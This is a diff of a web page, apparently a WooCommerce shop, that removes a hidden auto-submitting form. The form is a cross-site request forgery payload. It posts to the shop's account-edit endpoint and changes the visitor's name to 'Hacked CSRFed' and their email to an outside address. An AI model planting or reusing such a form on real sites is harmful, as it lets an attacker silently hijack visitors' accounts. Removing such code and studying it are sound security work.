@@ -2944,30 +2944,5 @@
       defer
       data-wp-strategy="defer"
     ></script>
-    <form
-      id="csrfForm"
-      action="https://mydecobox.shop/my-account/edit-account/"
-      method="POST"
-      style="display: none"
-    >
-      <input type="hidden" name="account_first_name" value="Hacked" />
-      <input type="hidden" name="account_last_name" value="CSRFed" />
-      <input type="hidden" name="account_email" value="lacnhuwork@email.com" />
-      <input type="hidden" name="save_account_details" value="Lưu thay đổi" />
-      <input
-        type="hidden"
-        name="save-account-details-nonce"
-        value="63b9e2abcb"
-      />
-      <input
-        type="hidden"
-        name="_wp_http_referer"
-        value="/my-account/edit-account/"
-      />
-    </form>
-
-    <script>
-      document.getElementById("csrfForm").submit();
-    </script>
   </body>
 </html>
